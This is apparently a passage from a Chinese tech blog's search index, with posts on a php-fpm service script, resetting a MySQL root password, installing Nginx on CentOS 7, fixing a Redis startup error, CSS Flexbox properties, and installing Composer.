&#123;start|stop|status|restart|condrestart|try-restart|reload|force-reload|configtest&#125;"</span></span><br><span class="line">        <span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>

<p>设置可执行权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x php-fpm</span><br></pre></td></tr></table></figure>

<p>再就是加到开机启动项里面去</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chkconfig --add php-fpm</span><br></pre></td></tr></table></figure>

<p>然后测试指令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">service php-fpm start <span class="comment">#开启</span></span><br><span class="line"></span><br><span class="line">service php-fpm stop  <span class="comment">#停止</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>CentOS下MySQL忘记root密码解决方法</title>
    <url>/articles/CentOS%E4%B8%8BMySQL%E5%BF%98%E8%AE%B0root%E5%AF%86%E7%A0%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>1．首先确认服务器出于安全的状态，也就是没有人能够任意地连接MySQL数据库。 因为在重新设置MySQL的root密码的期间，MySQL数据库完全出于没有密码保护的 状态下，其他的用户也可以任意地登录和修改MySQL的信息。可以采用将MySQL对 外的端口封闭，并且停止Apache以及所有的用户进程的方法实现服务器的准安全 状态。最安全的状态是到服务器的Console上面操作，并且拔掉网线。</p>
<p>2．修改MySQL的登录设置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># vim /etc/my.cnf</span><br></pre></td></tr></table></figure>

<p>在[mysqld]的段中加上一句：<code>skip-grant-tables</code></p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line"></span><br><span class="line">datadir=/var/lib/mysql</span><br><span class="line"></span><br><span class="line">socket=/var/lib/mysql/mysql.sock</span><br><span class="line"></span><br><span class="line">skip-grant-tables</span><br></pre></td></tr></table></figure>

<p>保存并且退出vi。</p>
<p>3．重新启动mysqld</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># service mysqld restart</span><br><span class="line"></span><br><span class="line">Stopping MySQL: [ OK ]</span><br><span class="line"></span><br><span class="line">Starting MySQL: [ OK ]</span><br></pre></td></tr></table></figure>

<p>4．登录并修改MySQL的root密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># mysql</span><br><span class="line"></span><br><span class="line">Welcome to the MySQL monitor. Commands end with ; or \g.</span><br><span class="line"></span><br><span class="line">Your MySQL connection id is 3 to server version: 3.23.56</span><br><span class="line"></span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the buffer.</span><br><span class="line"></span><br><span class="line">mysql&gt; USE mysql ;</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; UPDATE user SET Password = password ( &apos;new-password&apos; ) WHERE User = &apos;root&apos; ;</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">Rows matched: 2 Changed: 0 Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; flush privileges ;</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; quit</span><br></pre></td></tr></table></figure>

<p>5．将MySQL的登录设置修改回来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># vim /etc/my.cnf</span><br></pre></td></tr></table></figure>

<p>将刚才在[mysqld]的段中加上的<code>skip-grant-tables</code>删除</p>
<p>保存并且退出vim</p>
<p>6．重新启动mysqld</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># service mysqld restart</span><br><span class="line"></span><br><span class="line">Stopping MySQL: [ OK ]</span><br><span class="line"></span><br><span class="line">Starting MySQL: [ OK ]</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>CentOS7 安装Nginx</title>
    <url>/articles/CentOS7%20%E5%AE%89%E8%A3%85Nginx/</url>
    <content><![CDATA[<p>1、nginx依赖于pcre库,要先安装pcre</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install pcre pcre-devel</span><br></pre></td></tr></table></figure>

<p>2、下载<a href="http://nginx.org/download" target="_blank" rel="noopener">nginx</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http://nginx.org/download/nginx-1.10.2.tar.gz</span><br></pre></td></tr></table></figure>

<p>3、 解压安装包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar  -zxvf nginx-1.10.2.tar.gz         //解压安装包</span><br></pre></td></tr></table></figure>

<p>4、编译安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./configure --prefix=/usr/local/nginx     // 指定安装路径到/usr/local的nginx目录下</span><br><span class="line"></span><br><span class="line">--user=nginx \                            // 指定用户</span><br><span class="line"></span><br><span class="line">--group=nginx \                           // 指定组</span><br><span class="line"></span><br><span class="line">--with-http_ssl_module                    // 开启SSL加密功能</span><br><span class="line"></span><br><span class="line">make  &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p>5、启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./nginx</span><br></pre></td></tr></table></figure>

<p><strong>问题：不能绑定80端口, 80端口已经被占用</strong></p>
<ul>
<li><p>产生原因：有时是自己装了apache,nginx等,还有更多情况是操作系统自带了apache并作为服务启动，或者是阿里云的有个云盾，占用的也是这个端口</p>
</li>
<li><p>如何解决: 把占用80端口的软件或服务关闭即可，如下代码：</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -ant   //查看端口当前状态</span><br><span class="line"></span><br><span class="line">netstat -autp //查看80端口占用的进程,我这里是21907</span><br><span class="line"></span><br><span class="line">kill -9 21907  //杀死占用80端口的进程21907（pkill -9 http  //杀死所有交http的程序）</span><br></pre></td></tr></table></figure>

<p><strong>问题： nginx: [emerg] getpwnam(“nginx”) failed</strong></p>
<ul>
<li><p>产生原因：系统不存在nginx用户</p>
</li>
<li><p>如何解决: 创建nginx用户，如下代码：</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">useradd -s /sbin/nologin -M nginx</span><br></pre></td></tr></table></figure>

<p>6、开机自启动</p>
<p>如果是直接yum安装, 则下面命令就足够了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable nginx.service</span><br></pre></td></tr></table></figure>

<p>如果是编译安装，如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi /lib/systemd/system/nginx.service</span><br></pre></td></tr></table></figure>

<p>内容如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line"></span><br><span class="line">Description=nginx</span><br><span class="line"></span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line"></span><br><span class="line">Type=forking</span><br><span class="line"></span><br><span class="line">ExecStart=/usr/local/nginx/sbin/nginx</span><br><span class="line"></span><br><span class="line">ExecReload=/usr/local/nginx/sbin/nginx -s reload</span><br><span class="line"></span><br><span class="line">ExecStop=/usr/local/nginx/sbin/nginx -s quit</span><br><span class="line"></span><br><span class="line">PrivateTmp=true</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line"></span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<p>解释:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Unit]:服务的说明</span><br><span class="line"></span><br><span class="line">Description:描述服务</span><br><span class="line"></span><br><span class="line">After:描述服务类别</span><br><span class="line"></span><br><span class="line">[Service]服务运行参数的设置</span><br><span class="line"></span><br><span class="line">Type=forking是后台运行的形式</span><br><span class="line"></span><br><span class="line">ExecStart为服务的具体运行命令</span><br><span class="line"></span><br><span class="line">ExecReload为重启命令</span><br><span class="line"></span><br><span class="line">ExecStop为停止命令</span><br><span class="line"></span><br><span class="line">PrivateTmp=True表示给服务分配独立的临时空间</span><br><span class="line"></span><br><span class="line">注意：[Service]的启动、重启、停止命令全部要求使用绝对路径</span><br><span class="line"></span><br><span class="line">[Install]运行级别下服务安装的相关设置，可设置为多用户，即系统运行级别为3</span><br></pre></td></tr></table></figure>

<p>保存退出。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable nginx.service</span><br></pre></td></tr></table></figure>

<p>7.其他命令</p>
<p>启动nginx服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start nginx.service</span><br></pre></td></tr></table></figure>

<p>设置开机自启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable nginx.service</span><br></pre></td></tr></table></figure>

<p>停止开机自启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl disable nginx.service</span><br></pre></td></tr></table></figure>

<p>查看服务当前状态</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl status nginx.service</span><br></pre></td></tr></table></figure>

<p>重新启动服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl restart nginx.service</span><br></pre></td></tr></table></figure>

<p>查看所有已启动的服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl list-units --type=service</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>Centos7  Redis自启动报错</title>
    <url>/articles/Centos7%20%20Redis%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%A5%E9%94%99/</url>
    <content><![CDATA[<p>错误日志如下</p>
<blockquote>
<p>systemctl status redis.service</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">● redis.service - Redis persistent key-value database</span><br><span class="line"></span><br><span class="line">Loaded: loaded (/usr/lib/systemd/system/redis.service; enabled; vendor preset: disabled)</span><br><span class="line"></span><br><span class="line">Drop-In: /etc/systemd/system/redis.service.d</span><br><span class="line"></span><br><span class="line">└─limit.conf</span><br><span class="line"></span><br><span class="line">Active: failed (Result: exit-code) since Mon 2019-03-11 16:59:42 CST; 10s ago</span><br><span class="line"></span><br><span class="line">Process: 5711 ExecStop=/usr/libexec/redis-shutdown (code=exited, status=1/FAILURE)</span><br><span class="line"></span><br><span class="line">Process: 5709 ExecStart=/usr/bin/redis-server /etc/redis.conf --supervised systemd (code=exited, status=1/FAILURE)</span><br><span class="line"></span><br><span class="line">Main PID: 5709 (code=exited, status=1/FAILURE)</span><br><span class="line"></span><br><span class="line">Mar 11 16:59:42 iZj6c6ncdtlrfnzsy28pyiZ systemd[1]: Starting Redis persistent key-value database...</span><br><span class="line"></span><br><span class="line">Mar 11 16:59:42 iZj6c6ncdtlrfnzsy28pyiZ systemd[1]: redis.service: main process exited, code=exited, status=1/FAILURE</span><br><span class="line"></span><br><span class="line">Mar 11 16:59:42 iZj6c6ncdtlrfnzsy28pyiZ redis-shutdown[5711]: Could not connect to Redis at 127.0.0.1:6379: Connection refused</span><br><span class="line"></span><br><span class="line">Mar 11 16:59:42 iZj6c6ncdtlrfnzsy28pyiZ systemd[1]: redis.service: control process exited, code=exited status=1</span><br><span class="line"></span><br><span class="line">Mar 11 16:59:42 iZj6c6ncdtlrfnzsy28pyiZ systemd[1]: Failed to start Redis persistent key-value database.</span><br><span class="line"></span><br><span class="line">Mar 11 16:59:42 iZj6c6ncdtlrfnzsy28pyiZ systemd[1]: Unit redis.service entered failed state.</span><br><span class="line"></span><br><span class="line">Mar 11 16:59:42 iZj6c6ncdtlrfnzsy28pyiZ systemd[1]: redis.service failed.</span><br></pre></td></tr></table></figure>

<p>查错</p>
<blockquote>
<p>cat /lib/systemd/system/redis.service</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">//显示</span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line"></span><br><span class="line">Description=Redis persistent key-value database</span><br><span class="line"></span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line"></span><br><span class="line">ExecStart=/usr/bin/redis-server /etc/redis.conf --supervised systemd</span><br><span class="line"></span><br><span class="line">ExecStop=/usr/libexec/redis-shutdown</span><br><span class="line"></span><br><span class="line">Type=notify</span><br><span class="line"></span><br><span class="line">User=redis</span><br><span class="line"></span><br><span class="line">Group=redis</span><br><span class="line"></span><br><span class="line">RuntimeDirectory=redis</span><br><span class="line"></span><br><span class="line">RuntimeDirectoryMode=0755</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line"></span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<p>说明这个服务系统启动后是redis组的，所以改文件权限为redis组即可</p>
<p>解决方案</p>
<p><code>chown redis:redis /var/log/redis/redis.log</code></p>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>Flex 布局</title>
    <url>/articles/Flex%E5%B8%83%E5%B1%80/</url>
    <content><![CDATA[<p>布局的传统解决方案: 基于盒状模型，依赖 <code>display</code> 属性 + <code>position</code> 属性 + <code>float</code> 属性。它对于那些特殊布局非常不方便，比如，垂直居中就不容易实现。</p>
<p>2009年，W3C 提出了一种新的方案—-Flex 布局，可以简便、完整、响应式地实现各种页面布局。目前，它已经得到了所有浏览器的支持，这意味着，现在就能很安全地使用这项功能。</p>
<p><img src="/articles/Flex布局/1.jpg" alt> </p>
<p>Flex 布局将成为未来布局的首选方案。 JailBreak 为本文的所有示例制作了 <a href="http://static.vgee.cn/static/index.html" target="_blank" rel="noopener">Demo</a>，也可以参考。</p>
<p>以下内容主要参考了下面两篇文章：<a href="https://css-tricks.com/snippets/css/a-guide-to-flexbox/" target="_blank" rel="noopener">A Complete Guide to Flexbox</a> 和 <a href="https://scotch.io/tutorials/a-visual-guide-to-css3-flexbox-properties" target="_blank" rel="noopener">A Visual Guide to CSS3 Flexbox Properties</a>。</p>
<h3 id="一、Flex-布局是什么？"><a href="#一、Flex-布局是什么？" class="headerlink" title="一、Flex 布局是什么？"></a>一、Flex 布局是什么？</h3><p>Flex 是 Flexible Box 的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。</p>
<p>任何一个容器都可以指定为 Flex 布局。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>行内元素也可以使用 Flex 布局。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Webkit 内核的浏览器，必须加上-webkit前缀。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: -webkit-flex; <span class="comment">/* Safari */</span></span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意: 设为 Flex 布局以后，子元素的<code>float</code>、<code>clear</code>和<code>vertical-align</code>属性将失效。</p>
<h3 id="二、基本概念"><a href="#二、基本概念" class="headerlink" title="二、基本概念"></a>二、基本概念</h3><p>采用 Flex 布局的元素，称为 Flex 容器（flex container），简称”容器”。它的所有子元素自动成为容器成员，称为 Flex 项目（flex item），简称”项目”。</p>
<p><img src="/articles/Flex布局/14.png" alt></p>
<p>容器默认存在两根轴：水平的主轴（main axis）和垂直的交叉轴（cross axis）。 主轴的开始位置（与边框的交叉点）叫做<code>main start</code>，结束位置叫做<code>main end</code>；交叉轴的开始位置叫做<code>cross start</code>，结束位置叫做<code>cross end</code>。</p>
<p>项目默认沿主轴排列。单个项目占据的主轴空间叫做main size，占据的交叉轴空间叫做cross size。</p>
<h3 id="三、容器的属性"><a href="#三、容器的属性" class="headerlink" title="三、容器的属性"></a>三、容器的属性</h3><p>以下6个属性设置在容器上：</p>
<ul>
<li><p><a href="#3-1-flex-direction-属性">flex-direction</a> </p>
</li>
<li><p><a href="#3-2-flex-wrap-属性">flex-wrap</a></p>
</li>
<li><p><a href="#3-3-flex-flow-属性">flex-flow</a></p>
</li>
<li><p><a href="#3-4-justify-content-属性">justify-content</a></p>
</li>
<li><p><a href="#3-5-align-items-属性">align-items</a></p>
</li>
<li><p><a href="#3-6-align-content-属性">align-content</a></p>
</li>
</ul>
<h4 id="3-1-flex-direction-属性"><a href="#3-1-flex-direction-属性" class="headerlink" title="3.1 flex-direction 属性"></a>3.1 flex-direction 属性</h4><p><code>flex-direction</code>属性决定主轴的方向（即项目的排列方向）。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">flex-direction</span>: row | row-reverse | column | column-reverse;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/articles/Flex布局/2.png" alt></p>
<p>它可能有4个值。</p>
<blockquote>
<p><strong>row</strong>（默认值）：主轴为水平方向，起点在左端。</p>
</blockquote>
<blockquote>
<p><strong>row-reverse</strong>：主轴为水平方向，起点在右端。</p>
</blockquote>
<blockquote>
<p><strong>column</strong>：主轴为垂直方向，起点在上沿。</p>
</blockquote>
<blockquote>
<p><strong>column-reverse</strong>：主轴为垂直方向，起点在下沿。</p>
</blockquote>
<h4 id="3-2-flex-wrap-属性"><a href="#3-2-flex-wrap-属性" class="headerlink" title="3.2 flex-wrap 属性"></a>3.2 flex-wrap 属性</h4><p>默认情况下，项目都排在一条线（又称”轴线”）上。<code>flex-wrap</code>属性定义，如果一条轴线排不下，如何换行。</p>
<p><img src="/articles/Flex布局/3.png" alt></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">  <span class="attribute">flex-wrap</span>: nowrap | wrap | wrap-reverse;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它可能取三个值。</p>
<blockquote>
<p><strong>nowrap</strong>（默认）：不换行。</p>
</blockquote>
<p><img src="/articles/Flex布局/4.png" alt></p>
<blockquote>
<p><strong>wrap</strong>：换行，第一行在上方。</p>
</blockquote>
<p><img src="/articles/Flex布局/5.png" alt></p>
<blockquote>
<p><strong>wrap-reverse</strong>：换行，第一行在下方。</p>
</blockquote>
<p><img src="/articles/Flex布局/6.jpg" alt></p>
<h4 id="3-3-flex-flow-属性"><a href="#3-3-flex-flow-属性" class="headerlink" title="3.3 flex-flow 属性"></a>3.3 flex-flow 属性</h4><p><code>flex-flow</code>属性是<code>flex-direction</code>属性和<code>flex-wrap</code>属性的简写形式，默认值为<code>row nowrap</code>。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">flex-flow</span>: &lt;flex-direction&gt; || &lt;flex-wrap&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-4-justify-content-属性"><a href="#3-4-justify-content-属性" class="headerlink" title="3.4 justify-content 属性"></a>3.4 justify-content 属性</h4><p><code>justify-content</code>属性定义了项目在主轴上的对齐方式。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">justify-content</span>: flex-start | flex-end | center | space-between | space-around;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/articles/Flex布局/7.png" alt></p>
<p>它可能取5个值，具体对齐方式与轴的方向有关。下面假设主轴为从左到右。</p>
<blockquote>
<p><strong>flex-start</strong>（默认值）：左对齐</p>
</blockquote>
<blockquote>
<p><strong>flex-end</strong>：右对齐</p>
</blockquote>
<blockquote>
<p><strong>center</strong>： 居中</p>
</blockquote>
<blockquote>
<p><strong>space-between</strong>：两端对齐，之间的间隔都相等。</p>
</blockquote>
<blockquote>
<p><strong>space-around</strong>：两侧的间隔相等。之间的间隔比与边框的间隔大一倍。</p>
</blockquote>
<h4 id="3-5-align-items-属性"><a href="#3-5-align-items-属性" class="headerlink" title="3.5 align-items 属性"></a>3.5 align-items 属性</h4><p><code>align-items</code>属性定义项目在交叉轴上如何对齐。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">align-items</span>: flex-start | flex-end | center | baseline | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/articles/Flex布局/8.png" alt></p>
<p>它可能取5个值。具体的对齐方式与交叉轴的方向有关，下面假设交叉轴从上到下。</p>
<blockquote>
<p><strong>flex-start</strong>：交叉轴的起点对齐。</p>
</blockquote>
<blockquote>
<p><strong>flex-end</strong>：交叉轴的终点对齐。</p>
</blockquote>
<blockquote>
<p><strong>center</strong>：交叉轴的中点对齐。</p>
</blockquote>
<blockquote>
<p><strong>baseline</strong>: 项目的第一行文字的基线对齐。</p>
</blockquote>
<blockquote>
<p><strong>stretch</strong>（默认值）：如果项目未设置高度或设为auto，将占满整个容器的高度。</p>
</blockquote>
<h4 id="3-6-align-content-属性"><a href="#3-6-align-content-属性" class="headerlink" title="3.6 align-content 属性"></a>3.6 align-content 属性</h4><p><code>align-content</code>属性定义了多根轴线的对齐方式。只有一根轴线，该属性不起作用。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">align-content</span>: flex-start | flex-end | center | space-between | space-around | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/articles/Flex布局/9.png" alt></p>
<p>该属性可能取6个值。</p>
<blockquote>
<p><strong>flex-start</strong>：与交叉轴的起点对齐。</p>
</blockquote>
<blockquote>
<p><strong>flex-end</strong>：与交叉轴的终点对齐。</p>
</blockquote>
<blockquote>
<p><strong>center</strong>：与交叉轴的中点对齐。</p>
</blockquote>
<blockquote>
<p><strong>space-between</strong>：与交叉轴两端对齐，轴线之间的间隔平均分布。</p>
</blockquote>
<blockquote>
<p><strong>space-around</strong>：每根轴线两侧的间隔都相等。所以，轴线之间的间隔比轴线与边框的间隔大一倍。</p>
</blockquote>
<blockquote>
<p><strong>stretch</strong>（默认值）：轴线占满整个交叉轴。</p>
</blockquote>
<h3 id="四、项目的属性"><a href="#四、项目的属性" class="headerlink" title="四、项目的属性"></a>四、项目的属性</h3><p>以下6个属性设置在容器上:</p>
<ul>
<li><p><a href="#4-1-order属性">order</a></p>
</li>
<li><p><a href="#4-2-flex-grow属性">flex-grow</a></p>
</li>
<li><p><a href="#4-3-flex-shrink属性">flex-shrink</a></p>
</li>
<li><p><a href="#4-4-flex-basis属性">flex-basis</a></p>
</li>
<li><p><a href="#4-5-flex属性">flex</a></p>
</li>
<li><p><a href="#4-6-align-self属性">align-self</a></p>
</li>
</ul>
<h4 id="4-1-order属性"><a href="#4-1-order属性" class="headerlink" title="4.1 order属性"></a>4.1 order属性</h4><p><code>order</code>  排列顺序。数值越小，排列越靠前，默认为0。</p>
<p><img src="/articles/Flex布局/10.png" alt></p>
<h4 id="4-2-flex-grow属性"><a href="#4-2-flex-grow属性" class="headerlink" title="4.2 flex-grow属性"></a>4.2 flex-grow属性</h4><p><code>flex-grow</code>   放大比例，默认为<code>0</code>，即如果存在剩余空间，也不放大。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: &lt;number&gt;; <span class="comment">/* default 0 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果所有项目的<code>flex-grow</code>属性都为1，则它们将等分剩余空间（如果有的话）。如果一个项目的<code>flex-grow</code>属性为2，其他项目都为1，则前者占据的剩余空间将比其他项多一倍。</p>
<p><img src="/articles/Flex布局/11.png" alt></p>
<h4 id="4-3-flex-shrink属性"><a href="#4-3-flex-shrink属性" class="headerlink" title="4.3 flex-shrink属性"></a>4.3 flex-shrink属性</h4><p><code>flex-shrink</code> 缩小比例，默认为<code>1</code>，即如果空间不足，该项目将缩小。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: &lt;number&gt;; <span class="comment">/* default 1 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果所有项目的<code>flex-shrink</code>属性都为1，当空间不足时，都将等比例缩小。如果一个项目的<code>flex-shrink</code>属性为0，其他项目都为1，则空间不足时，前者不缩小。</p>
<p>负值对该属性无效。</p>
<p><img src="/articles/Flex布局/12.png" alt></p>
<h4 id="4-4-flex-basis属性"><a href="#4-4-flex-basis属性" class="headerlink" title="4.4 flex-basis属性"></a>4.4 flex-basis属性</h4><p><code>flex-basis</code>  分配多余空间之前，占据的主轴空间。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为<code>auto</code>，即项目的本来大小。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-basis</span>: &lt;length&gt; | auto; <span class="comment">/* default auto */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它可以设为跟<code>width</code>或<code>height</code>属性一样的值（比如350px），则项目将占据固定空间。</p>
<h4 id="4-5-flex属性"><a href="#4-5-flex属性" class="headerlink" title="4.5 flex属性"></a>4.5 flex属性</h4><p><code>flex</code> 是<code>flex-grow</code>, <code>flex-shrink</code> 和 <code>flex-basis</code>的简写，默认值为<code>0 1 auto</code>。后两个属性可选。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex</span>: none | [ &lt;<span class="string">'flex-grow'</span>&gt; &lt;<span class="string">'flex-shrink'</span>&gt;? || &lt;<span class="string">'flex-basis'</span>&gt; ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该属性有两个快捷值：<code>auto</code> (<code>1 1 auto</code>) 和 <code>none</code> (<code>0 0 auto</code>)。</p>
<p>建议优先使用这个属性，而不是单独写三个分离的属性，因为浏览器会推算相关值。</p>
<h4 id="4-6-align-self属性"><a href="#4-6-align-self属性" class="headerlink" title="4.6 align-self属性"></a>4.6 align-self属性</h4><p><code>align-self</code> 允许单个项目有与其他项目不一样的对齐方式，可覆盖<code>align-items</code>属性。默认值为<code>auto</code>，表示继承父元素的<code>align-items</code>属性，如果没有父元素，则等同于<code>stretch</code>。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">align-self</span>: auto | flex-start | flex-end | center | baseline | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/articles/Flex布局/13.png" alt></p>
]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
      <tags>
        <tag>网页布局</tag>
      </tags>
  </entry>
  <entry>
    <title>Composer教程</title>
    <url>/articles/Composer%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol>
<li>下载composer安装器</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php -r "copy('https://getcomposer.org/installer', 'composer-setup.php');"</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>校验安装包是否正确(可选，以v1.9.3为例)</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php -r "if (hash_file('sha384', 'composer-setup.php') === 'e0012edf3e80b6978849f5eff0d4b4e4c79ff1609dd1e613307e16318854d24ae64f26d17af3ef0bf7cfb710ca74755a') &#123; echo 'Installer verified'; &#125; else &#123; echo 'Installer corrupt'; unlink('composer-setup.php'); &#125; echo PHP_EOL;"</span><br></pre></td></tr></table></figure>

<p><code>注意hash值有版本差异</code></p>
<ol start="3">
<li>安装composer</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php composer-setup.php --install-dir=bin</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>卸载安装包(可选)</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php -r "unlink('composer-setup.php');"</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>windows系统中 使用composer命令(可选)</li>
</ol>
<ul>
<li><p>新建 composer.bat 文件，内容为  @php “%~dp0composer.phar” %*</p>
</li>
<li><p>环境变量中添加composer.bat文件路径</p>
</li>
</ul>
<ol start="6">
<li>国内镜像切换(可选)</li>
</ol>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/</span><br></pre></td></tr></table></figure>

<p>更多参考 <a href="https://getcomposer.org/download/" target="_blank" rel="noopener">https://getcomposer.org/download/</a></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><h4 id="install-命令"><a href="#install-命令" class="headerlink" title="install 命令"></a>install 命令</h4><p>要使用 Composer，我们需要先在项目的目录下创建一个 composer.json 文件，文件描述了项目的依赖关系。</p>
<p>文件格式如下：</p>
